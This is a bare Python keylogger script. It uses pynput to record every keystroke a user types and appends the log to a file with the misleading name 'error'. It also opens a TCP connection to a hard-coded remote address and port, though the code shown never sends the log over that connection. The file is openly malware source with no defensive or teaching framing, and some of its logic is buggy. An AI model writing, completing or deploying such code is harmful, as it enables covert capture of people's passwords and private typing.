import socket
import pynput.keyboard as ky
import time

log = ""

class Keylog():
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
    
    def callback(self,key):
        global log
        try:
            log = log + str(key.char)
        except AttributeError:
            if key == key.space:
                log = log + " "
            else:
                log = log + str(key)
    
    def save_log(self):
        global log
        with open("error","a") as file:
            file.write(log)
    
    def log_listen(self):
        keylog = ky.Listener(on_press=self.callback)
        with keylog:
            self.save_log()
            keylog.join()

listen = Keylog("1.1.1.1",8080)
listen.log_listen()
